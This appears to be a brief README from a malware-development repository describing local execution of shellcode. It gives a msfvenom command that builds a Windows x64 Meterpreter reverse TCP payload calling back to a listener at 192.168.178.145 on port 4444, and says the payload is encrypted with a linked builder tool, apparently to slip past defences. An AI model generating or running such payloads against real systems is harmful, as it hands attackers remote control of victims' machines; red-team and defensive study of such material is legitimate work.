# Local Payload Execution

Payload generated with msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.178.145 LPORT=4444 -f hex
```

Payload encrypted and deobfuscated with [payloadBuilder.exe](https://github.com/L4k4r/maldev/tree/main/tools/payloadBuilder)
